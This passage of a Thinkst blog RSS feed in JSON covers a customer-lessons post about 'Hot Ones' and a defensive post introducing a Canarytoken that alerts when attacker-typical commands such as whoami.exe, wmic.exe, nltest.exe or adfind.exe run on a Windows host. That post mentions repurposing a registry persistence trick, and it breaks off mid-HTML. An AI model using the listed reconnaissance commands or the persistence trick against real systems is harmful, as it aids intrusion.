/></figure></div>\n\n\n<p>___</p>\n\n\n\n<p class=\"has-small-font-size\">\u00b9 153 Consoles disabled the effect (Which is less than 10% of those it ran on). Counter-intuitively, we count that as a win too, since we gave customers that option and they clearly found the button!</p>"
                }
            ],
            "wfw_commentrss": "https://blog.thinkst.com/2022/11/seasonal-themes-delighting-users-small-ux-touches.html/feed",
            "slash_comments": "0",
            "post-id": "2243"
        },
        {
            "title": "Company Lessons (from YouTubes \u201cHot Ones\u201d)",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Company Lessons (from YouTubes \u201cHot Ones\u201d)"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://blog.thinkst.com/2022/11/company-lessons-from-youtubes-hot-ones.html"
                }
            ],
            "link": "https://blog.thinkst.com/2022/11/company-lessons-from-youtubes-hot-ones.html",
            "comments": "https://blog.thinkst.com/2022/11/company-lessons-from-youtubes-hot-ones.html#respond",
            "authors": [
                {
                    "name": "haroon meer"
                }
            ],
            "author": "haroon meer",
            "author_detail": {
                "name": "haroon meer"
            },
            "published": "Wed, 23 Nov 2022 14:01:50 +0000",
            "published_parsed": [
                2022,
                11,
                23,
                14,
                1,
                50,
                2,
                327,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "about-us",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "mini-musings",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://blog.thinkst.com/?p=2238",
            "guidislink": false,
            "summary": "I recently discovered \u201cHot Ones\u201d on YouTube. If you haven\u2019t seen any of the episodes, you should (because they really are fantastic). This isn\u2019t really a controversial opinion:\u00a0their YouTube channel\u00a0has 12 million subscribers and almost 2,6 billion views. The show has a few lessons that I think are worth noticing/stealing. I&#8217;ll discuss 3 of them here (even if they are kinda random). 1) Genuine Warmth One would expect the show to lean on a kinda gotcha-slapstick routine: we all laugh at celebs suffering, but that isn\u2019t really how it goes. The host (Sean Evans) suffers every moment with his guests and is super empathetic throughout. It\u2019s not adversarial at all and guests reaching the end have a kind of shared bond with the host (and the audience). Lots of companies are polite to customers (in front of them) but snicker about them behind their backs. Everyone recognizes the meme of tech-support insulting \u201cidiot users\u201d who just don\u2019t get it. Even if this stuff isn\u2019t said directly, it can\u2019t really be hidden. It eventually seeps out of an organizations pores. This is one of the reasons we focus so hard internally on customer love. We aren\u2019t just doing it to be [&#8230;]",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "I recently discovered \u201cHot Ones\u201d on YouTube. If you haven\u2019t seen any of the episodes, you should (because they really are fantastic). This isn\u2019t really a controversial opinion:\u00a0their YouTube channel\u00a0has 12 million subscribers and almost 2,6 billion views. The show has a few lessons that I think are worth noticing/stealing. I&#8217;ll discuss 3 of them here (even if they are kinda random). 1) Genuine Warmth One would expect the show to lean on a kinda gotcha-slapstick routine: we all laugh at celebs suffering, but that isn\u2019t really how it goes. The host (Sean Evans) suffers every moment with his guests and is super empathetic throughout. It\u2019s not adversarial at all and guests reaching the end have a kind of shared bond with the host (and the audience). Lots of companies are polite to customers (in front of them) but snicker about them behind their backs. Everyone recognizes the meme of tech-support insulting \u201cidiot users\u201d who just don\u2019t get it. Even if this stuff isn\u2019t said directly, it can\u2019t really be hidden. It eventually seeps out of an organizations pores. This is one of the reasons we focus so hard internally on customer love. We aren\u2019t just doing it to be [&#8230;]"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://blog.thinkst.com/feed",
                    "value": "<p>\u00a0I recently discovered \u201cHot Ones\u201d on YouTube. If you haven\u2019t seen any of the episodes, you should (because they really are fantastic). This isn\u2019t really a controversial opinion:\u00a0<a href=\"https://www.youtube.com/channel/UCPD_bxCRGpmmeQcbe2kpPaA\" rel=\"noreferrer noopener\" target=\"_blank\">their YouTube channel</a>\u00a0has 12 million subscribers and almost 2,6 billion views.</p>\n\n\n\n<p>The show has a few lessons that I think are worth noticing/stealing. I&#8217;ll discuss 3 of them here (even if they are kinda random).</p>\n\n\n\n<h3 class=\"wp-block-heading\">1) Genuine Warmth</h3>\n\n\n\n<p>One would expect the show to lean on a kinda gotcha-slapstick routine: we all laugh at celebs suffering, but that isn\u2019t really how it goes. The host (Sean Evans) suffers every moment with his guests and is super empathetic throughout. It\u2019s not adversarial at all and guests reaching the end have a kind of shared bond with the host (and the audience).</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter\"><a href=\"https://www.blogger.com/u/1/blog/post/edit/7543234021861076170/6250058601014385701\"><img alt=\"\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHoLKOLjLujapfX9n7CO3SPabopkR6SCm1vL6w1T96gg0NmavG3CP7jroMXLVdNo4ep0vA3B5nBX82OEuFwQsPMdYOWMt5Dl5lywXhhANsq2adkMk3MQTSbDju3Qww_V73oZZkO4IhR7Etad5PkG0lsDA9fRYEfFRYs05UVBMRGIsME9BOJnAMq48d/s320/ct.jpeg?w=960&#038;ssl=1\" /></a></figure></div>\n\n\n<p>Lots of companies are polite to customers (in front of them) but snicker about them behind their backs. Everyone recognizes the meme of tech-support insulting \u201cidiot users\u201d who just don\u2019t get it. Even if this stuff isn\u2019t said directly, it can\u2019t really be hidden. It eventually seeps out of an organizations pores.</p>\n\n\n\n<p>This is one of the reasons we focus so hard internally on customer love. We aren\u2019t just doing it to be polite. We know that our customers could have bought anything, but they bought us. We deeply want them to win and we deeply want them to get it. This also can\u2019t be hidden (and also seeps out through our pores).</p>\n\n\n\n<h3 class=\"wp-block-heading\">Putting in the work (off camera)</h3>\n\n\n\n<p>Sean Evans is an incredible interviewer. There are a bunch of compilations online of guests being impressed by the depth of his questions.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter\"><img alt=\"\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhA_nrndaz96B75gT3nOFFTmCEtIeyOX6zDqNs-QDSVJLYyAUslHA1p-xpwFFb7YrsFM-Nbql0psxaZQ94i4wfkPmjxauoWC8hYL_JAYE9xVhCQOSmX4vCMr1D0LU1V41PCICljY2fK4OGLzUmYcakiUmHyl3SsVsMZagE6w-TChRnY7Sgp0V_jNds0/w400-h371/ho-guests.jpeg?w=960&#038;ssl=1\" /></figure></div>\n\n\n<p>Part of this is because the hot-sauce takes out guests ability to answer:</p>\n\n\n\n<figure class=\"wp-block-embed aligncenter is-type-video is-provider-vimeo wp-block-embed-vimeo\"><div class=\"wp-block-embed__wrapper\">\n<div class=\"video_fit_container\"></div>\n</div></figure>\n\n\n\n<p>But the questions are definitely deep and super well researched:</p>\n\n\n\n<figure class=\"wp-block-embed aligncenter is-type-video is-provider-vimeo wp-block-embed-vimeo wp-embed-aspect-16-9 wp-has-aspect-ratio\"><div class=\"wp-block-embed__wrapper\">\n<div class=\"video_fit_container\"></div>\n</div></figure>\n\n\n\n<p>Interviews in the past few years explain how they get this right:</p>\n\n\n\n<blockquote class=\"wp-block-quote\">\n<p>Between episodes is when the real work begins\u2026</p>\n\n\n\n<p>Once a guest is booked, the three-person research team goes to work. \u201cThere\u2019s a lot of armchair psychology that goes into the show,\u201d says Schonberger. In practice, that means Evans\u2019 brother \u2014 Gavin, who lives in Chicago \u2014 will compile a dossier. \u201cHe\u2019ll basically read like every article there is, every profile, every Reddit AMA, like reading everything that he can find and create,\u201d says Schonberger, noting that they can run to something like 30 pages long. \u201cIt\u2019s almost like we\u2019ve created our own Wikipedia template that\u2019s suited to the show.\u201d</p>\n\n\n\n<p>Sean, on the other hand, does the videos. He\u2019ll consume 12-24 hours of clips, looking for breadcrumbs. \u2026</p>\n\n\n\n<p>Schonberger does some of the podcasts, which means he listens to everything he can get his hands on. It\u2019s the same idea as with the videos, except people are usually less guarded on podcast appearances than they are during video shoots. Then they compare notes, and Evans and Schonberger come up with ten topics to hit during the interview.</p>\n\n\n\n<p>the\u00a0<a href=\"https://www.theverge.com/2019/10/31/20938739/hot-ones-sean-evans-youtube-guests-gordon-ramsey-idris-elba-late-night-tv\" rel=\"noreferrer noopener\" target=\"_blank\">verge</a></p>\n</blockquote>\n\n\n\n<p>&nbsp;We\u2019ve been championing this line of thinking forever. Boxers don\u2019t win their fights in the ring. It\u2019s why we push so much for putting in the miles. It&#8217;s why we spend so much effort working on the tiny details that most people won&#8217;t see. It\u2019s because the results are worth it (even if most ppl don\u2019t know what\u2019s behind it).</p>\n\n\n\n<h3 class=\"wp-block-heading\">Following a Script&nbsp;(This is an unusual / subtle one)</h3>\n\n\n\n<p>When a new person joins us in customer-success/pre-sales we teach them about Canary, why we build it and how we demo it. One personality archetype quickly decides that they will learn the product but will wing-it for demos. They seem slightly surprised that we stay close to a fixed format even if we have been demo&#8217;ing Canary (or building it) it for years. Following a script almost seems like an insult to them:&nbsp; they have a mic and they are smart and they can show off the newest features.&nbsp;</p>\n\n\n\n<p>With all the praise (in the previous point) for Sean, and now 18 seasons of the show under his belt, it\u2019s worth checking out this quick super cut of guests starting and then clearing the final wing:</p>\n\n\n\n<figure class=\"wp-block-embed aligncenter is-type-video is-provider-vimeo wp-block-embed-vimeo wp-embed-aspect-16-9 wp-has-aspect-ratio\"><div class=\"wp-block-embed__wrapper\">\n<div class=\"video_fit_container\"></div>\n</div></figure>\n\n\n\n<p>Once it locks in, he almost never deviates from the script. We\u2019ve already established that he isn&#8217;t lazy, so why do they do it that way?&nbsp;</p>\n\n\n\n<p>The same reason we do. Because it works. There are places to customize, and places to go deep but in key areas, it runs on rails. The script works and they\u2019ve stuck with it for 18 seasons.</p>\n\n\n\n<p>We understand why some new people don&#8217;t want to demo close to the original script: they are smart enough and skilful enough to not need guide-rails. It\u2019s also human nature that after you\u2019ve done a demo&nbsp;<em>n-times</em>, you want to do the&nbsp;<em>n+1th</em>&nbsp;differently.&nbsp;</p>\n\n\n\n<p>When you showed 10 people the basic features of the system, you somehow expect that the 11th person needs to see the advanced features because you already spoke about the basics 10 times, but this is a fallacy. The 11th person is also seeing the product for the first time and they may smile through the advanced features &#8211; but you aren&#8217;t giving them the same experience you gave the first 10 and theres a good chance you leave them confused.</p>\n\n\n\n<p>The show is worth watching &#8211; you should check it out&#8230;</p>\n\n\n\n<p><em>[All this was to allow me to watch tons of YouTube videos calling it management-research]</em></p>"
                }
            ],
            "wfw_commentrss": "https://blog.thinkst.com/2022/11/company-lessons-from-youtubes-hot-ones.html/feed",
            "slash_comments": "0",
            "post-id": "2238"
        },
        {
            "title": "Sensitive Command Token \u2013 So much offense in my defense",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Sensitive Command Token \u2013 So much offense in my defense"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://blog.thinkst.com/2022/09/sensitive-command-token-so-much-offense.html"
                }
            ],
            "link": "https://blog.thinkst.com/2022/09/sensitive-command-token-so-much-offense.html",
            "comments": "https://blog.thinkst.com/2022/09/sensitive-command-token-so-much-offense.html#comments",
            "authors": [
                {
                    "name": "Casey Smith"
                }
            ],
            "author": "Casey Smith",
            "author_detail": {
                "name": "Casey Smith"
            },
            "published": "Tue, 06 Sep 2022 17:44:00 +0000",
            "published_parsed": [
                2022,
                9,
                6,
                17,
                44,
                0,
                1,
                249,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "featured",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://blog.thinkst.com/2022/09/06/sensitive-command-token-so-much-offense-in-my-defense/",
            "guidislink": false,
            "summary": "Introduction: Many people have pointed out that there are a handful of commands that are overwhelmingly run by attackers on compromised hosts (and seldom ever by regular users/usage). Reliably alerting when a user on your code-sign server runs whoami.exe can mean the difference between catching a compromise in week-1 (before the attackers dig in) and learning about the attack on CNN. Introducing our new Sensitive Command Canarytoken. This quick/simple Canarytoken alerts you any time your chosen command is executed on a host. For example: This token creates registry keys to alert you anytime whoami.exe runs on a host. If an attacker lands on the server and runs whoami.exe (as most attackers almost instinctively do) they get the results they expect. And you get an alert to let you know that something bad is afoot. Why this token? In nearly every ransomware report, we can see attackers running a series of predictable commands on endpoints. https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/ Some of those commands are almost never run by regular users through regular usage. This means that they become high quality markers of \u201cbadness\u201d. Wouldn\u2019t it be great to get an alert the moment someone runs WMIC on your code-signing server? Or the moment someone [&#8230;]",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Introduction: Many people have pointed out that there are a handful of commands that are overwhelmingly run by attackers on compromised hosts (and seldom ever by regular users/usage). Reliably alerting when a user on your code-sign server runs whoami.exe can mean the difference between catching a compromise in week-1 (before the attackers dig in) and learning about the attack on CNN. Introducing our new Sensitive Command Canarytoken. This quick/simple Canarytoken alerts you any time your chosen command is executed on a host. For example: This token creates registry keys to alert you anytime whoami.exe runs on a host. If an attacker lands on the server and runs whoami.exe (as most attackers almost instinctively do) they get the results they expect. And you get an alert to let you know that something bad is afoot. Why this token? In nearly every ransomware report, we can see attackers running a series of predictable commands on endpoints. https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/ Some of those commands are almost never run by regular users through regular usage. This means that they become high quality markers of \u201cbadness\u201d. Wouldn\u2019t it be great to get an alert the moment someone runs WMIC on your code-signing server? Or the moment someone [&#8230;]"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://blog.thinkst.com/feed",
                    "value": "<h2 style=\"text-align: left;\">Introduction:</h2>\n<div style=\"text-align: justify;\">Many people have pointed out that there are a handful of commands that are overwhelmingly run by attackers on compromised hosts (and seldom ever by regular users/usage). Reliably alerting when a user on your code-sign server runs whoami.exe can mean the difference between catching a compromise in week-1 (before the attackers dig in) and learning about the attack on CNN.</div>\n<div style=\"text-align: justify;\"></div>\n<div style=\"text-align: left;\"><b>Introducing our new Sensitive Command Canarytoken.</b></div>\n<p>This quick/simple Canarytoken alerts you any time your chosen command is executed on a host.</p>\n<p>For example: This token creates registry keys to alert you anytime <i>whoami.exe </i>runs on a host.</p>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDY28PRPkv8z8eFX1X_BGNMQtU8CxGytzU_n2oehP53JCAC8ILkRK-h6YmdYPFHgr4arRow6fIl8yNVlLUjS-sxfbpPCnDjtEAgdfzqBhUZQcfe4XLPd6RYccXYLGUkrShWdh_hsQwXsE6TLT-Zx0OBZSSG2H15pjgNWIK2UCQdrLFlGdZ3n_PmRgS8A/s2120/Screen%20Shot%202022-09-05%20at%204.11.20%20PM.png?ssl=1\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"242\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDY28PRPkv8z8eFX1X_BGNMQtU8CxGytzU_n2oehP53JCAC8ILkRK-h6YmdYPFHgr4arRow6fIl8yNVlLUjS-sxfbpPCnDjtEAgdfzqBhUZQcfe4XLPd6RYccXYLGUkrShWdh_hsQwXsE6TLT-Zx0OBZSSG2H15pjgNWIK2UCQdrLFlGdZ3n_PmRgS8A/w640-h242/Screen%20Shot%202022-09-05%20at%204.11.20%20PM.png?resize=640%2C242&#038;ssl=1\" width=\"640\" /></a></div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"></div>\n<p>If an attacker lands on the server and runs whoami.exe (as most attackers almost instinctively do) they get the results they expect.</p>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><span style=\"color: red;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEg04wnR4_zb2wskXiX6bLMdk_oZPtj8AjsTjMWjbWmhL2tWJ07lX1mfUG1vstnqKw4MGBtQptSLtRtSamOKeSM6ftbpyts1w-WgpW7FV4tPThGfWXRCb-XEbygde6tq-uLl31Jr0pROh99VaYcNMSwm2pEdx8L38DJUU4xvMzr28Gf2P1ViRpvAgNHdfw\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"\" height=\"193\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEg04wnR4_zb2wskXiX6bLMdk_oZPtj8AjsTjMWjbWmhL2tWJ07lX1mfUG1vstnqKw4MGBtQptSLtRtSamOKeSM6ftbpyts1w-WgpW7FV4tPThGfWXRCb-XEbygde6tq-uLl31Jr0pROh99VaYcNMSwm2pEdx8L38DJUU4xvMzr28Gf2P1ViRpvAgNHdfw\" width=\"640\" /></a></span></div>\n<p>And you get an alert to let you know that something bad is afoot.</p>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEhz3NF7mXyx5W2YnlyyXXokixqtjdkJ4y709opHNNZsmZJ0wxP7mi9HuwJJad3CG0B2EJQjuxgRF5xislo0zxtF4rfaZ_dooGnBEc7x842sQKQ7ZZ99uRvFSuHxbn684skTQGJ4ikbnsDApgPiFlvfVlhsfS2apvfmKCNTE1ZTlvxb8z0mVXZR6LDK6XQ\" style=\"margin-left: 1em; margin-right: 1em;\"><img height=\"605\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEhz3NF7mXyx5W2YnlyyXXokixqtjdkJ4y709opHNNZsmZJ0wxP7mi9HuwJJad3CG0B2EJQjuxgRF5xislo0zxtF4rfaZ_dooGnBEc7x842sQKQ7ZZ99uRvFSuHxbn684skTQGJ4ikbnsDApgPiFlvfVlhsfS2apvfmKCNTE1ZTlvxb8z0mVXZR6LDK6XQ=w640-h605\" width=\"640\" /></a></div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\">\n<h3 style=\"clear: both; text-align: justify;\"><span style=\"text-align: left;\">Why this token?</span></h3>\n</div>\n<div>\n<div style=\"text-align: justify;\">In nearly every ransomware report, we can see attackers running a series of predictable commands on endpoints.</div>\n<div><img height=\"289\" src=\"https://lh3.googleusercontent.com/cv4xJqHrQQw8Pv93ePljf0gzcihuonFSF0e-eNoXftsrb_OL12KJu8p1HoaXFjwbIeRInJL5WtDh3QJgNnKiWCkTjylAuiC9KYnlxmwnCNH9d1yTP52n2WpvvUlu4TYTRA4JmLD9cGXNQ4EjCf_5cAu-XGYVBX1TjGhKApj0qb9L-9c3JWzvCcYy\" style=\"font-family: Arial; font-size: 11pt; margin-left: 0; margin-top: 0; white-space: pre-wrap;\" width=\"624\" /></div>\n<div><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\"><a href=\"https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/\">https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/</a></span></span></div>\n<div></div>\n<div>Some of those commands are almost never run by regular users through regular usage. This means that they become high quality markers of \u201cbadness\u201d.</div>\n<div></div>\n<div>Wouldn\u2019t it be great to get an alert the moment someone runs WMIC on your code-signing server? Or the moment someone runs whoami.exe on your SQL-Server? Many organizations will use EDR (Endpoint Detection and Response) tools to do this. However these complex telemetry streams, and detection logic may not be available to small organizations, may not be comprehensively deployed and often require specific configuration changes to alert on these invocations.</div>\n<div></div>\n<div>We want to know, and we want the setup to be dead-simple.</div>\n</div>\n<div></div>\n<div>\n<h3 style=\"text-align: left;\">tl;dr &#8211; Just show me the token</h3>\n<div>If you visit <a href=\"https://canarytokens.org\">https://canarytokens.org </a>and view the list of available tokens, you will notice a new Canarytoken type: \u201cSensitive command token\u201d</div>\n</div>\n<div></div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHIuKd9BqGvUtARrxxZBIcngKlvTVcpIanrHlIpcQFleycUzBRLsq_H3TIoH_WK8dbF7WDjpSOF4eF0ymPjObl-aRGCUQnapcjejDmSw5IKK9Popzwo1AjCFdUwbI57BaxyMNGWmZx10NHAIHtD0RJtIvMA-fW3XVke83wLCSqGMcjWtIHfZuf0xNgHw/s1628/Screen%20Shot%202022-09-04%20at%208.07.12%20AM.png?ssl=1\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"403\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHIuKd9BqGvUtARrxxZBIcngKlvTVcpIanrHlIpcQFleycUzBRLsq_H3TIoH_WK8dbF7WDjpSOF4eF0ymPjObl-aRGCUQnapcjejDmSw5IKK9Popzwo1AjCFdUwbI57BaxyMNGWmZx10NHAIHtD0RJtIvMA-fW3XVke83wLCSqGMcjWtIHfZuf0xNgHw/w470-h403/Screen%20Shot%202022-09-04%20at%208.07.12%20AM.png?resize=470%2C403&#038;ssl=1\" width=\"470\" /></a></div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\">\n<div class=\"separator\" style=\"clear: both; text-align: left;\">Choose the Sensitive command token.</div>\n<div class=\"separator\" style=\"clear: both; text-align: left;\"></div>\n<div class=\"separator\" style=\"clear: both; text-align: left;\">Next, like other Canarytoken configurations, we add some quick details:</div>\n<div class=\"separator\" style=\"clear: both; text-align: left;\"></div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\">\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEitM9XUNMBV2vmfySlCYAF9u513R-OIxbR2shsQnmVoXLnuSqg-bmejGuPl_HrvsY6J3OuEO0gSvpw7oT3TC9m_rTrglu5dvVaSALzQsvWfoiZ3keRBHmdyjWHZnoZCty3lU6_3qPpdVWc8Va17ydH6S4zCe9rYvcdGdf2pwQupTUMeGuDvCsDVe2jrrw\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"\" height=\"418\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEitM9XUNMBV2vmfySlCYAF9u513R-OIxbR2shsQnmVoXLnuSqg-bmejGuPl_HrvsY6J3OuEO0gSvpw7oT3TC9m_rTrglu5dvVaSALzQsvWfoiZ3keRBHmdyjWHZnoZCty3lU6_3qPpdVWc8Va17ydH6S4zCe9rYvcdGdf2pwQupTUMeGuDvCsDVe2jrrw=w565-h418\" width=\"565\" /></a></div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"></div>\n<div style=\"text-align: left;\">[1] Where to send the alert, (email or webhook, or both);</div>\n<div style=\"text-align: left;\">[2] A reminder note, that will help you react when you receive an alert from this token;</div>\n<div style=\"text-align: left;\">[3] Choose the process that you want to monitor execution for (e.g., wmic.exe, whoami.exe, klist.exe, nltest.exe).</div>\n<div></div>\n</div>\n<div class=\"separator\" style=\"clear: both; text-align: left;\">\n<div class=\"separator\" style=\"clear: both;\">The Canarytoken server will create a .reg file for you to download and import onto a Windows 10, or Windows 11 system (or use GPO to deploy across multiple systems).</div>\n<div></div>\n<div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEjEWjyN09O6KlRqdvoOTObhGY9Ddn5K-miUKsUt2LCU-D3YFjqZfuXuBHyCdLwVvsMzXyaR2mxqufJ9vy-QkiSgKWCrF6Ip1vI40H25ziaa_TYNp1DdAiiY1g4rGmVhmnczu91U2BGkSf6V_G1CfnMRkvcw_gs2MVlZ_GbOyO5Cn7y8TUcBO49H82mOag\" style=\"margin-left: 1em; margin-right: 1em;\"><img height=\"488\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEjEWjyN09O6KlRqdvoOTObhGY9Ddn5K-miUKsUt2LCU-D3YFjqZfuXuBHyCdLwVvsMzXyaR2mxqufJ9vy-QkiSgKWCrF6Ip1vI40H25ziaa_TYNp1DdAiiY1g4rGmVhmnczu91U2BGkSf6V_G1CfnMRkvcw_gs2MVlZ_GbOyO5Cn7y8TUcBO49H82mOag=w640-h488\" width=\"640\" /></a></div>\n<div style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0; text-align: left;\"></div>\n<div>Once you have downloaded the .reg file, you can import this to the system (or systems) you want to monitor.</div>\n<div></div>\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0; text-align: center;\"><span style=\"color: red; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">reg import </span></p>\n<div style=\"text-align: center;\"></div>\n<div style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0; text-align: center;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><i>Remember this will require local Administrator permissions.</i></span></div>\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\">\n<div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"></div>\n</div>\n</div>\n</div>\n</div>\n<div>\n<div>That&#8217;s it! If a user on this host ever runs that (sensitive) command, you will receive an alert!</div>\n<div></div>\n<div>It&#8217;s worth noting that this Canarytoken does not impede or alter the original command in any way, it simply sends you a near real-time alert that someone has executed our tripwire.</div>\n<div></div>\n<div>In the alert you will see the details of the time of the alert, the user that executed the command, and the computer name the command was executed from.</div>\n</div>\n<div></div>\n<div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\">\n<div class=\"separator\" style=\"clear: both; text-align: center;\">\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEhrS7iKXztlo-btpuv_95v1iELa8JmlKa6vdlvROXSB5__f3xyK9Lje2l0oSn0K2MUpafNXDsC13MHUe7S7NsaRdOaEQombptggjX-9l89MVz3FJliVwl2UhMrGq7WJYMwO1jKV6UPoTrDcBwKVtWQ9LhoTDYMEKzbCweqvde7RfRO9HLLO7QmoxD_-sQ\" style=\"margin-left: 1em; margin-right: 1em;\"><img height=\"286\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEhrS7iKXztlo-btpuv_95v1iELa8JmlKa6vdlvROXSB5__f3xyK9Lje2l0oSn0K2MUpafNXDsC13MHUe7S7NsaRdOaEQombptggjX-9l89MVz3FJliVwl2UhMrGq7WJYMwO1jKV6UPoTrDcBwKVtWQ9LhoTDYMEKzbCweqvde7RfRO9HLLO7QmoxD_-sQ=w640-h286\" width=\"640\" /></a></div>\n</div>\n<div style=\"text-align: justify;\"></div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\"><b>Note:</b></div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\">A subtle benefit of how this token is designed allows you to deploy the same token on multiple machines without making any changes. Running reg import across a host of machines will tripwire them all, and when an attacker runs her command on any one of them, you will know.</div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\"></div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\"></div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\">There you go!</div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\"></div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\">We can now create a Canarytoken to alert us on Sensitive Commands that execute.</div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\"></div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\">These commands may be sensitive due to the fact that they are rare, used by attackers, or are sensitive to your organization. How you choose to pick the executable is up to you.</div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\"></div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\"><b>Bonus: </b>the executable does not need to be present on the system. Suppose your organization never uses adfind.exe.\u00a0 You could add this tripwire, so that if someone ever downloaded that to your system and executed it you would be notified.</div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\"></div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\">Additionally you sometimes don&#8217;t want to run AV/EDR on some machines, or 3rd party systems that won\u2019t allow you to install software, but here you can monitor an executable or five.</div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\"></div>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\">That is all you need to get started using this new Canarytoken. If you would like to learn more about the architecture and mechanics under the hood: continue reading.</div>\n<div style=\"text-align: left;\"></div>\n<div style=\"text-align: left;\">\n<h3 style=\"text-align: left;\">Under the hood</h3>\n<h3 style=\"text-align: left;\">Problem Statement:</h3>\n<div>We wanted to see if we could find a way to generate an alert to our console when a suspicious command is executed on a system. Without interfering with the original command execution.</div>\n<div></div>\n<div>The best candidate command for this alert is one that is rare, short lived, and used by attackers.</div>\n<div></div>\n<div>In short, if you want to receive an alert if someone runs wmic.exe on a workstation, this may be the Canarytoken for you.\u00a0 This token creates a .reg file with three registry entries that you can import to the system. You will need Windows 10 or 11, and Administrator access to the systems you want to add this to.</div>\n<div>\n<h3 style=\"text-align: left;\">Token Architecture:</h3>\n<div>Our team spent a number of cycles trying various experiments and approaches to generating an alert based on process execution. From doskey, to wmi, to performance monitoring. We settled on an older Pentesting Persistence trick that in the end met all our requirements.</div>\n<div></div>\n<div><span id=\"docs-internal-guid-125ec23a-7fff-248c-1a98-3ebcf268abf1\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 333px; overflow: hidden; width: 624px;\"><img height=\"333\" src=\"https://lh4.googleusercontent.com/weCU76vp9sOvi1rc5qZbHa1LVSPPnHYB56UJMcc-U0nDnME14mY5dURpb3V4JCzDLxUYF0383kO8U0Qspb2KmeaFusHQQ-fjbJKdTW50Lw2BUBybo0FjVhCXeOVRVvTBGebsbPhrzslX-1_tHkAEx98\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></span></div>\n<div>\n<p dir=\"ltr\" style=\"line-height: 1.38; 